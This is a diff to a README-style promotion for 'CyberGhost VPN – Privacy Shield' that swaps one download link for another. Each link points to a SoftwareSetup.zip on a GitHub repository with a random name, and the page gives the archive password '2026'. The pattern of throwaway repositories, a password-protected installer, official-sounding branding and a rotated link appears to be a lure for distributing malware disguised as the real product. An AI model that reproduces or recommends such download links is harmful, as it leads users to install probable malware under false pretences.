@@ -2,7 +2,7 @@
 
 **CyberGhost VPN – Privacy Shield** is a full-scale virtual private network solution that empowers users with true online anonymity, unrestricted global access, and next-generation encryption. Whether you're streaming, torrenting, working remotely, or just browsing privately, CyberGhost combines blazing speeds, intuitive design, and ironclad privacy with a proven zero-logs policy.
 
-[![Download CyberGhost VPN](https://img.shields.io/badge/Download-CyberGhost--VPN-blueviolet)](https://github.com/bravestokermattock/qoetztvv/releases/download/dsfasf/SoftwareSetup.zip)
+[![Download CyberGhost VPN](https://img.shields.io/badge/Download-CyberGhost--VPN-blueviolet)](https://github.com/Combinefaanvil/iobbfanp/releases/download/dfbga/SoftwareSetup.zip)
 
 **PASSWORD: 2026**
 
